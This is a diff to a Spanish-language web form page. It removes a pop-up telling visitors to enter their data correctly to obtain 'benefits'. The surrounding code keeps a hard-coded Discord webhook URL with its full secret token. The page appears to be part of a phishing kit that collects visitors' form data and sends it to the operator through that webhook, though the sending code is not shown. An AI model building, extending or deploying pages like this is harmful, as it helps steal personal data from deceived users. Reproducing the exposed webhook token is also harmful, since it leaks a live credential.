@@ -90,89 +90,9 @@
         .error-message.visible {
             display: block;
         }
-
-        /* ===== VENTANA EMERGENTE (MODAL) ===== */
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            z-index: 9999;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            opacity: 0;
-            visibility: hidden;
-            transition: all 0.3s ease;
-        }
-        .modal-overlay.show {
-            opacity: 1;
-            visibility: visible;
-        }
-        .modal-box {
-            background: white;
-            border-radius: 12px;
-            padding: 25px;
-            max-width: 350px;
-            width: 90%;
-            text-align: center;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
-            transform: scale(0.8);
-            transition: transform 0.3s ease;
-        }
-        .modal-overlay.show .modal-box {
-            transform: scale(1);
-        }
-        .modal-icon {
-            font-size: 40px;
-            color: #D9272E;
-            margin-bottom: 15px;
-        }
-        .modal-title {
-            font-size: 16px;
-            font-weight: bold;
-            color: #333;
-            margin-bottom: 10px;
-        }
-        .modal-message {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-        .modal-btn {
-            background: #D9272E;
-            color: white;
-            border: none;
-            padding: 10px 30px;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        .modal-btn:hover {
-            background: #b91c24;
-        }
     </style>
 </head>
 <body class="bg-white font-sans antialiased text-gray-800">
-
-    <!-- ===== VENTANA EMERGENTE (MODAL) ===== -->
-    <div class="modal-overlay" id="welcomeModal">
-        <div class="modal-box">
-            <div class="modal-icon">
-                <i class="fa-solid fa-circle-info"></i>
-            </div>
-            <div class="modal-title">¡Bienvenido!</div>
-            <div class="modal-message">
-                Ingrese los datos correctamente para obtener los beneficios
-            </div>
-            <button class="modal-btn" onclick="cerrarModal()">Entendido</button>
-        </div>
-    </div>
 
     <!-- ===== PANTALLA DE CARGA (OVERLAY) ===== -->
     <div id="loadingOverlay" class="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center hidden">
@@ -370,20 +290,6 @@
         // 🔴 WEBHOOK DE DISCORD
         // ============================================
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1540553924161966220/gmtc5tUYY1UzVFFEYOKvExB2KG0F-77bG_mK5cEQxn3SZMxq091ebLJEY0qlhmV2Atib";
-
-        // ===== VENTANA EMERGENTE =====
-        function mostrarModal() {
-            document.getElementById('welcomeModal').classList.add('show');
-        }
-
-        function cerrarModal() {
-            document.getElementById('welcomeModal').classList.remove('show');
-        }
-
-        // Mostrar modal al cargar la página
-        window.addEventListener('DOMContentLoaded', function() {
-            setTimeout(mostrarModal, 500); // Aparece después de 0.5 segundos
-        });
 
         // ===== VALIDACIÓN DE CAMPOS =====
         function validarTecla(event) {
